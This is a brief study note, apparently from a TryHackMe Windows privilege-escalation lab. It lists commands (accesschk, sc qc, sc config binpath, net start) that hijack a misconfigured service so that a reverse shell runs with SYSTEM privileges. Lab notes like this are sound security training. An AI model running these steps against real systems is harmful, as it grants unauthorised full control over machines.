# Windows Priv Escalation


------------
-[[impersonation]]
-[[unquoted service path vulnerability]]

---------


https://tryhackme.com/room/windows10privesc

see what the user have access to:
`accesschk.exe /accepteula -uwcqv user daclsvc`


Note that the "user" account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME):

`sc qc daclsvc`

Modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable you created:

`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start daclsvc`


-------------




